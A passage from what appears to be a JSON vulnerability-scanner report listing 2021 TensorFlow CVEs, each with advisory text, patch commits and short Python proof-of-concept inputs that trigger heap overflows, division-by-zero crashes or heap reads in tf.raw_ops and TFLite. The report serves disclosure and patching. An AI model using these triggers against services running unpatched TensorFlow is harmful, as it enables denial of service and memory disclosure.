                "markdown": "**Vulnerability CVE-2021-29577**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29577)|\n\n### Impact\nThe implementation of `tf.raw_ops.AvgPool3DGrad` is vulnerable to a heap buffer overflow:\n\n```python\nimport tensorflow as tf\n\norig_input_shape = tf.constant([10, 6, 3, 7, 7], shape=[5], dtype=tf.int32)\ngrad = tf.constant([0.01, 0, 0], shape=[3, 1, 1, 1, 1], dtype=tf.float32)\nksize = [1, 1, 1, 1, 1]\nstrides = [1, 1, 1, 1, 1]\npadding = \"SAME\"\n\ntf.raw_ops.AvgPool3DGrad(\n  orig_input_shape=orig_input_shape, grad=grad, ksize=ksize, strides=strides,\n  padding=padding)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/d80ffba9702dc19d1fac74fc4b766b3fa1ee976b/tensorflow/core/kernels/pooling_ops_3d.cc#L376-L450) assumes that the `orig_input_shape` and `grad` tensors have similar first and last dimensions but does not check that this assumption is validated.\n\n### Patches\nWe have patched the issue in GitHub commit [6fc9141f42f6a72180ecd24021c3e6b36165fe0d](https://github.com/tensorflow/tensorflow/commit/6fc9141f42f6a72180ecd24021c3e6b36165fe0d).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29556",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29556"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29556",
              "help": {
                "text": "Vulnerability CVE-2021-29556\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29556](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29556)\n### Impact\nAn attacker can cause a denial of service via a FPE runtime error in `tf.raw_ops.Reverse`:\n\n```python\nimport tensorflow as tf\n\ntensor_input = tf.constant([], shape=[0, 1, 1], dtype=tf.int32)\ndims = tf.constant([False, True, False], shape=[3], dtype=tf.bool)\n\ntf.raw_ops.Reverse(tensor=tensor_input, dims=dims)\n``` \n    \nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/36229ea9e9451dac14a8b1f4711c435a1d84a594/tensorflow/core/kernels/reverse_op.cc#L75-L76) performs a division based on the first dimension of the tensor argument:\n    \n```cc\nconst int64 N = input.dim_size(0);\nconst int64 cost_per_unit = input.NumElements() / N;\n```\n\nSince this is controlled by the user, an attacker can trigger a denial of service.\n\n### Patches\nWe have patched the issue in GitHub commit [4071d8e2f6c45c1955a811fee757ca2adbe462c1](https://github.com/tensorflow/tensorflow/commit/4071d8e2f6c45c1955a811fee757ca2adbe462c1).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29556**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29556](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29556)|\n\n### Impact\nAn attacker can cause a denial of service via a FPE runtime error in `tf.raw_ops.Reverse`:\n\n```python\nimport tensorflow as tf\n\ntensor_input = tf.constant([], shape=[0, 1, 1], dtype=tf.int32)\ndims = tf.constant([False, True, False], shape=[3], dtype=tf.bool)\n\ntf.raw_ops.Reverse(tensor=tensor_input, dims=dims)\n``` \n    \nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/36229ea9e9451dac14a8b1f4711c435a1d84a594/tensorflow/core/kernels/reverse_op.cc#L75-L76) performs a division based on the first dimension of the tensor argument:\n    \n```cc\nconst int64 N = input.dim_size(0);\nconst int64 cost_per_unit = input.NumElements() / N;\n```\n\nSince this is controlled by the user, an attacker can trigger a denial of service.\n\n### Patches\nWe have patched the issue in GitHub commit [4071d8e2f6c45c1955a811fee757ca2adbe462c1](https://github.com/tensorflow/tensorflow/commit/4071d8e2f6c45c1955a811fee757ca2adbe462c1).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29587",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29587"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29587",
              "help": {
                "text": "Vulnerability CVE-2021-29587\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29587](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29587)\n### Impact\nThe `Prepare` step of the `SpaceToDepth` TFLite operator [does not check for 0 before division](https://github.com/tensorflow/tensorflow/blob/5f7975d09eac0f10ed8a17dbb6f5964977725adc/tensorflow/lite/kernels/space_to_depth.cc#L63-L67).\n\n```cc \nconst int block_size = params-\u003eblock_size;\nconst int input_height = input-\u003edims-\u003edata[1];\nconst int input_width = input-\u003edims-\u003edata[2];\nint output_height = input_height / block_size;\nint output_width = input_width / block_size;\n```   \n\nAn attacker can craft a model such that `params-\u003eblock_size` would be zero.\n\n### Patches\nWe have patched the issue in GitHub commit [0d45ea1ca641b21b73bcf9c00e0179cda284e7e7](https://github.com/tensorflow/tensorflow/commit/0d45ea1ca641b21b73bcf9c00e0179cda284e7e7).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-29587**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29587](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29587)|\n\n### Impact\nThe `Prepare` step of the `SpaceToDepth` TFLite operator [does not check for 0 before division](https://github.com/tensorflow/tensorflow/blob/5f7975d09eac0f10ed8a17dbb6f5964977725adc/tensorflow/lite/kernels/space_to_depth.cc#L63-L67).\n\n```cc \nconst int block_size = params-\u003eblock_size;\nconst int input_height = input-\u003edims-\u003edata[1];\nconst int input_width = input-\u003edims-\u003edata[2];\nint output_height = input_height / block_size;\nint output_width = input_width / block_size;\n```   \n\nAn attacker can craft a model such that `params-\u003eblock_size` would be zero.\n\n### Patches\nWe have patched the issue in GitHub commit [0d45ea1ca641b21b73bcf9c00e0179cda284e7e7](https://github.com/tensorflow/tensorflow/commit/0d45ea1ca641b21b73bcf9c00e0179cda284e7e7).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29537",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29537"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29537",
              "help": {
                "text": "Vulnerability CVE-2021-29537\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29537](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29537)\n### Impact\nAn attacker can cause a heap buffer overflow in `QuantizedResizeBilinear` by passing in invalid thresholds for the quantization:\n\n```python\nimport tensorflow as tf\n\nimages = tf.constant([], shape=[0], dtype=tf.qint32)\nsize = tf.constant([], shape=[0], dtype=tf.int32) \nmin = tf.constant([], dtype=tf.float32)\nmax = tf.constant([], dtype=tf.float32)\n\ntf.raw_ops.QuantizedResizeBilinear(images=images, size=size, min=min, max=max, align_corners=False, half_pixel_centers=False)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/50711818d2e61ccce012591eeb4fdf93a8496726/tensorflow/core/kernels/quantized_resize_bilinear_op.cc#L705-L706) assumes that the 2 arguments are always valid scalars and tries to access the numeric value directly:\n\n```cc\nconst float in_min = context-\u003einput(2).flat\u003cfloat\u003e()(0);\nconst float in_max = context-\u003einput(3).flat\u003cfloat\u003e()(0);\n```\n\nHowever, if any of these tensors is empty, then `.flat\u003cT\u003e()` is an empty buffer and accessing the element at position 0 results in overflow.\n\n### Patches \nWe have patched the issue in GitHub commit [f6c40f0c6cbf00d46c7717a26419f2062f2f8694](https://github.com/tensorflow/tensorflow/commit/f6c40f0c6cbf00d46c7717a26419f2062f2f8694).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29537**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29537](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29537)|\n\n### Impact\nAn attacker can cause a heap buffer overflow in `QuantizedResizeBilinear` by passing in invalid thresholds for the quantization:\n\n```python\nimport tensorflow as tf\n\nimages = tf.constant([], shape=[0], dtype=tf.qint32)\nsize = tf.constant([], shape=[0], dtype=tf.int32) \nmin = tf.constant([], dtype=tf.float32)\nmax = tf.constant([], dtype=tf.float32)\n\ntf.raw_ops.QuantizedResizeBilinear(images=images, size=size, min=min, max=max, align_corners=False, half_pixel_centers=False)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/50711818d2e61ccce012591eeb4fdf93a8496726/tensorflow/core/kernels/quantized_resize_bilinear_op.cc#L705-L706) assumes that the 2 arguments are always valid scalars and tries to access the numeric value directly:\n\n```cc\nconst float in_min = context-\u003einput(2).flat\u003cfloat\u003e()(0);\nconst float in_max = context-\u003einput(3).flat\u003cfloat\u003e()(0);\n```\n\nHowever, if any of these tensors is empty, then `.flat\u003cT\u003e()` is an empty buffer and accessing the element at position 0 results in overflow.\n\n### Patches \nWe have patched the issue in GitHub commit [f6c40f0c6cbf00d46c7717a26419f2062f2f8694](https://github.com/tensorflow/tensorflow/commit/f6c40f0c6cbf00d46c7717a26419f2062f2f8694).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-37687",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37687"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37687",
              "help": {
                "text": "Vulnerability CVE-2021-37687\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37687](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37687)\n### Impact\nTFLite`s [`GatherNd` implementation](https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124) does not support negative indices but there are no checks for this situation.\n\nHence, an attacker can read arbitrary data from the heap by carefully crafting a model with negative values in `indices`.\n\nSimilar issue exists in [`Gather` implementation](https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc).\n\n```python\nimport tensorflow as tf\nimport numpy as np\ntf.compat.v1.disable_v2_behavior()\n\nparams = tf.compat.v1.placeholder(name=\"params\", dtype=tf.int64, shape=(1,))\nindices = tf.compat.v1.placeholder(name=\"indices\", dtype=tf.int64, shape=())\n\nout = tf.gather(params, indices, name=`out`)\n\nwith tf.compat.v1.Session() as sess:\n   converter = tf.compat.v1.lite.TFLiteConverter.from_session(sess, [params, indices], [out])\n   tflite_model = converter.convert()\n\ninterpreter = tf.lite.Interpreter(model_content=tflite_model)\ninterpreter.allocate_tensors()\n\ninput_details = interpreter.get_input_details()\noutput_details = interpreter.get_output_details()\n\nparams_data = np.reshape(np.array([1], dtype=np.int64), newshape=(1,))\nindices_data = np.reshape(np.array(-10, dtype=np.int64), newshape=())\ninterpreter.set_tensor(input_details[0][`index`], params_data)\ninterpreter.set_tensor(input_details[1][`index`], indices_data)\n\ninterpreter.invoke()\n```\n\n### Patches\nWe have patched the issue in GitHub commits [bb6a0383ed553c286f87ca88c207f6774d5c4a8f](https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f) and [eb921122119a6b6e470ee98b89e65d721663179d](https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security  guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security.",
                "markdown": "**Vulnerability CVE-2021-37687**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37687](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37687)|\n\n### Impact\nTFLite`s [`GatherNd` implementation](https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124) does not support negative indices but there are no checks for this situation.\n\nHence, an attacker can read arbitrary data from the heap by carefully crafting a model with negative values in `indices`.\n\nSimilar issue exists in [`Gather` implementation](https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc).\n\n```python\nimport tensorflow as tf\nimport numpy as np\ntf.compat.v1.disable_v2_behavior()\n\nparams = tf.compat.v1.placeholder(name=\"params\", dtype=tf.int64, shape=(1,))\nindices = tf.compat.v1.placeholder(name=\"indices\", dtype=tf.int64, shape=())\n\nout = tf.gather(params, indices, name=`out`)\n\nwith tf.compat.v1.Session() as sess:\n   converter = tf.compat.v1.lite.TFLiteConverter.from_session(sess, [params, indices], [out])\n   tflite_model = converter.convert()\n\ninterpreter = tf.lite.Interpreter(model_content=tflite_model)\ninterpreter.allocate_tensors()\n\ninput_details = interpreter.get_input_details()\noutput_details = interpreter.get_output_details()\n\nparams_data = np.reshape(np.array([1], dtype=np.int64), newshape=(1,))\nindices_data = np.reshape(np.array(-10, dtype=np.int64), newshape=())\ninterpreter.set_tensor(input_details[0][`index`], params_data)\ninterpreter.set_tensor(input_details[1][`index`], indices_data)\n\ninterpreter.invoke()\n```\n\n### Patches\nWe have patched the issue in GitHub commits [bb6a0383ed553c286f87ca88c207f6774d5c4a8f](https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f) and [eb921122119a6b6e470ee98b89e65d721663179d](https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security  guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37636",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37636"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37636",
              "help": {
                "text": "Vulnerability CVE-2021-37636\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37636](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37636)\n### Impact\nThe implementation of `tf.raw_ops.SparseDenseCwiseDiv` is vulnerable to a division by 0 error:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.raw_ops.SparseDenseCwiseDiv( \n  sp_indices=np.array([[4]]),\n  sp_values=np.array([-400]),\n  sp_shape=np.array([647.]),\n  dense=np.array([0]))\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/a1bc56203f21a5a4995311825ffaba7a670d7747/tensorflow/core/kernels/sparse_dense_binary_op_shared.cc#L56) uses a common class for all binary operations but fails to treat the division by 0 case separately.\n\n### Patches\nWe have patched the issue in GitHub commit [d9204be9f49520cdaaeb2541d1dc5187b23f31d9](https://github.com/tensorflow/tensorflow/commit/d9204be9f49520cdaaeb2541d1dc5187b23f31d9).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37636**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37636](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37636)|\n\n### Impact\nThe implementation of `tf.raw_ops.SparseDenseCwiseDiv` is vulnerable to a division by 0 error:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.raw_ops.SparseDenseCwiseDiv( \n  sp_indices=np.array([[4]]),\n  sp_values=np.array([-400]),\n  sp_shape=np.array([647.]),\n  dense=np.array([0]))\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/a1bc56203f21a5a4995311825ffaba7a670d7747/tensorflow/core/kernels/sparse_dense_binary_op_shared.cc#L56) uses a common class for all binary operations but fails to treat the division by 0 case separately.\n\n### Patches\nWe have patched the issue in GitHub commit [d9204be9f49520cdaaeb2541d1dc5187b23f31d9](https://github.com/tensorflow/tensorflow/commit/d9204be9f49520cdaaeb2541d1dc5187b23f31d9).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37683",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37683"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37683",
              "help": {
                "text": "Vulnerability CVE-2021-37683\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37683](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37683)\n### Impact\nThe implementation of division in TFLite is [vulnerable to a division by 0 error](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/lite/kernels/div.cc)\n\nThere is no check that the divisor tensor does not contain zero elements.\n\n### Patches\nWe have patched the issue in GitHub commit [1e206baedf8bef0334cca3eb92bab134ef525a28](https://github.com/tensorflow/tensorflow/commit/1e206baedf8bef0334cca3eb92bab134ef525a28).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37683**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37683](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37683)|\n\n### Impact\nThe implementation of division in TFLite is [vulnerable to a division by 0 error](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/lite/kernels/div.cc)\n\nThere is no check that the divisor tensor does not contain zero elements.\n\n### Patches\nWe have patched the issue in GitHub commit [1e206baedf8bef0334cca3eb92bab134ef525a28](https://github.com/tensorflow/tensorflow/commit/1e206baedf8bef0334cca3eb92bab134ef525a28).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37653",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37653"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37653",
              "help": {
                "text": "Vulnerability CVE-2021-37653\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37653](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37653)\n### Impact\nAn attacker can trigger a crash via a floating point exception in `tf.raw_ops.ResourceGather`:\n\n```python\nimport tensorflow as tf\n\ntensor = tf.constant(value=[[]],shape=(0,1),dtype=tf.uint32)\nv = tf.Variable(tensor)\ntf.raw_ops.ResourceGather(\n  resource=v.handle,\n  indices=[0],\n  dtype=tf.uint32,\n  batch_dims=1,\n  validate_indices=False)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/resource_variable_ops.cc#L725-L731) computes the value of a value, `batch_size`, and then divides by it without checking that this value is not 0. \n\n### Patches\nWe have patched the issue in GitHub commit  [ac117ee8a8ea57b73d34665cdf00ef3303bc0b11](https://github.com/tensorflow/tensorflow/commit/ac117ee8a8ea57b73d34665cdf00ef3303bc0b11).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. \n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37653**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37653](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37653)|\n\n### Impact\nAn attacker can trigger a crash via a floating point exception in `tf.raw_ops.ResourceGather`:\n\n```python\nimport tensorflow as tf\n\ntensor = tf.constant(value=[[]],shape=(0,1),dtype=tf.uint32)\nv = tf.Variable(tensor)\ntf.raw_ops.ResourceGather(\n  resource=v.handle,\n  indices=[0],\n  dtype=tf.uint32,\n  batch_dims=1,\n  validate_indices=False)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/resource_variable_ops.cc#L725-L731) computes the value of a value, `batch_size`, and then divides by it without checking that this value is not 0. \n\n### Patches\nWe have patched the issue in GitHub commit  [ac117ee8a8ea57b73d34665cdf00ef3303bc0b11](https://github.com/tensorflow/tensorflow/commit/ac117ee8a8ea57b73d34665cdf00ef3303bc0b11).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. \n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37665",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37665"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37665",
              "help": {
                "text": "Vulnerability CVE-2021-37665\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37665](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37665)\n### Impact\nDue to incomplete validation in MKL implementation of requantization, an  attacker can trigger undefined behavior via binding a reference to a null pointer or can access data outside the bounds of heap allocated arrays:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.RequantizationRangePerChannel(\n  input=[],\n  input_min=[0,0,0,0,0],\n  input_max=[1,1,1,1,1],\n  clip_value_max=1)\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/mkl/mkl_requantization_range_per_channel_op.cc) does not validate the dimensions of the `input` tensor.\n\nA similar issue occurs in `MklRequantizePerChannelOp`:\n\n```python\nimport tensorflow as tf \nfrom tensorflow.python.ops import gen_math_ops\n\ngen_math_ops.requantize_per_channel(\n  input=[],\n  input_min=[-100,-100,-100,-100,-100],\n  input_max=[-100,-100,-100],\n  requested_output_min=[-100,-100,-100,-100,-100],\n  requested_output_max=[],\n  out_type=tf.int)\n``` \n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/mkl/mkl_requantize_per_channel_op.cc) does not perform full validation for all the input arguments.\n\n### Patches\nWe have patched the issue in GitHub commit [9e62869465573cb2d9b5053f1fa02a81fce21d69](https://github.com/tensorflow/tensorflow/commit/9e62869465573cb2d9b5053f1fa02a81fce21d69) and in the Github commit [203214568f5bc237603dbab6e1fd389f1572f5c9](https://github.com/tensorflow/tensorflow/commit/203214568f5bc237603dbab6e1fd389f1572f5c9).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
